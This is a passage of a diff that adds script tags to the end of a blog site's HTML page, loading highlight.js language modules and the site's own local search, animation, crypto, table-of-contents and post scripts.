+  <script src="/axiom-blog-site/static/js/hljs-coffeescript.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dart.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-elixir.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-erlang.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fortran.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fsharp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-gradle.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-groovy.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-haskell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-kotlin.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-latex.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-lisp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nix.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-ocaml.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-pgsql.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-protobuf.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-scala.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-vim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/search.js?v=1"></script>
+  <script src="/axiom-blog-site/static/js/animations.js?v=3"></script>
+  
+  <script src="/axiom-blog-site/static/js/crypto.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/app.js?v=3"></script>
+  <script src="/axiom-blog-site/static/js/toc.js?v=7"></script>
+  <script src="/axiom-blog-site/static/js/post.js?v=4"></script>
+
+</body>
+</html>
